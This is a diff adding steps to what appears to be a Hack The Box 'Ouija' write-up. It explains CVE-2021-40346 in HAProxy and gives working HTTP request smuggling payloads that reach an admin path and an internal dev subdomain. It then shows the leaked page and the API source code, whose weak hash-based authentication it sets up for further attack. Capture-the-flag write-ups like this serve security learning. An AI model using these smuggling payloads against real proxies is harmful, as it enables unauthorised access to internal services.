@@ -176,3 +176,163 @@ dev.m                   [Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 83
 ```
 
 # STEP 3 - Searching for Known Vulnerabilities
+Now we did some googling to check for known vulnerabilities for the technologies that are used by the target web app. This way we found CVE-2021-40346, an Integer Overflow vulnerability in HAProxy, that was discovered by [JFrog Security](https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/). This vulnerability enables HTTP Request Smuggling (HFS), which allows an attacker to “smuggle” HTTP requests to the backend server, without the proxy server being aware of it. For further details on HRS, HAProxy's HTTP request processing phases, and the attack itself, see [this blog post](https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/) by JFrog.
+
+![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/84ff7f03-a6b7-40a3-8f41-e112d300a067)
+
+# STEP 4 - HAProxy Exploit
+After (quite a lot) of trial and error and with the help of this [YouTube video](https://www.youtube.com/watch?v=RBaul29pcZs), we managed to find a request format that worked and went through. It is important that the "smuggled" request ends with a double CRLF (`/r/n/r/n`), so it is processed by the server as a valid request.
+
+```http
+POST /index.html HTTP/1.1
+Host: ouija.htb
+Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
+Content-Length: 23
+
+GET /admin HTTP/1.1
+h:GET /index.html HTTP/1.1
+Host: ouija.htb
+
+```
+
+**TIP:** the value of the second `Content-Length` header is the number of characters in the string `GET /admin HTTP/1.1/r/nh:`. The easiest way to get this value is by highlighting this string using the cursor in Burp's Repeater (which is used to send the request).
+
+To determine how to use this vulnerability to our advantage, we went over the inforamtion we gathered about the target so far. This vulneraility could allow us to acces the subdomain we found that returned the 403 error. We attempted to access all the subdomain we found, but only one of them actually had content - `http://dev.ouija.htb` (a hint towards it being the only interesting one is the time duration in took for Ffuf to get a response for it, in comparison to the others).
+
+```http
+POST /index.html HTTP/1.1
+Host: ouija.htb
+Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
+Content-Length: 37
+
+GET http://dev.ouija.htb HTTP/1.1
+h:GET /index.html HTTP/1.1
+Host: ouija.htb
+
+```
+
+The response to the smuggled request appears in the bottom of the response to the "main" one:
+
+```html
+...SNIP...
+HTTP/1.1 200 OK
+date: Tue, 05 Dec 2023 09:01:13 GMT
+server: Apache/2.4.52 (Ubuntu)
+vary: Accept-Encoding
+content-length: 670
+content-type: text/html; charset=UTF-8
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Ouija dev</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <h1>projects under development</h1>
+
+    <ul>
+        <li>
+            <strong>Project Name:</strong> Api
+            <br>
+            <strong>Api Source Code:</strong> <a href="http://dev.ouija.htb/editor.php?file=app.js" target="_blank">app.js</a>
+            <strong>Init File:</strong> <a href="http://dev.ouija.htb/editor.php?file=init.sh" target="_blank">init.sh</a>
+        </li>
+
+    </ul>
+
+    <footer>
+        &copy; 2023 ouija software
+    </footer>
+</body>
+
+</html>
+```
+
+This subdomain hosts a website for Ouija Dev and contains the projects that are currently under development. One of this projects it named API, and there are references to two files that we can use the HRS vulnerability to view. 
+
+```javascript
+#api.
+var app = express();
+var crt = require('crypto');
+var b85 = require('base85');
+var fs = require('fs');
+const key = process.env.k;
+
+app.listen(3000, ()=>{ console.log("listening @ 3000"); });
+
+function d(b){
+    s1=(Buffer.from(b, 'base64')).toString('utf-8');
+    s2=(Buffer.from(s1.toLowerCase(), 'hex'));
+    return s2;
+}
+function generate_cookies(identification){
+    var sha256=crt.createHash('sha256');
+    wrap = sha256.update(key);
+    wrap = sha256.update(identification);
+    hash=sha256.digest('hex');
+    return(hash);
+}
+function verify_cookies(identification, rhash){
+    if( ((generate_cookies(d(identification)))) === rhash){
+        return 0;
+    }else{return 1;}
+}
+function ensure_auth(q, r) {
+    if(!q.headers['ihash']) {
+        r.json("ihash header is missing");
+    }
+    else if (!q.headers['identification']) {
+        r.json("identification header is missing");
+    }
+
+    if(verify_cookies(q.headers['identification'], q.headers['ihash']) != 0) {
+        r.json("Invalid Token");
+    }
+    else if (!(d(q.headers['identification']).includes("::admin:True"))) {
+        r.json("Insufficient Privileges");
+    }
+}
+
+app.get("/login", (q,r,n) => {
+    if(!q.query.uname || !q.query.upass){
+        r.json({"message":"uname and upass are required"});
+    }else{
+        if(!q.query.uname || !q.query.upass){
+            r.json({"message":"uname && upass are required"});
+        }else{
+            r.json({"message":"disabled (under dev)"});
+        }
+    }
+});
+app.get("/register", (q,r,n) => {r.json({"message":"__disabled__"});});
+app.get("/users", (q,r,n) => {
+    ensure_auth(q, r);
+    r.json({"message":"Database unavailable"});
+});
+app.get("/file/get",(q,r,n) => {
+    ensure_auth(q, r);
+    if(!q.query.file){
+        r.json({"message":"?file= i required"});
+    }else{
+        let file = q.query.file;
+        if(file.startsWith("/") || file.includes('..') || file.includes("../")){
+            r.json({"message":"Action not allowed"});
+        }else{
+            fs.readFile(file, 'utf8', (e,d)=>{
+                if(e) {
+                    r.json({"message":e});
+                }else{
+                    r.json({"message":d});
+                }
+            });
+        }
+    }
+});
+app.get("/file/upload", (q,r,n) =>{r.json({"message":"Disabled for security reasons"});});
+app.get("/*", (q,r,n) => {r.json("200 not found , redirect to .");});
+```
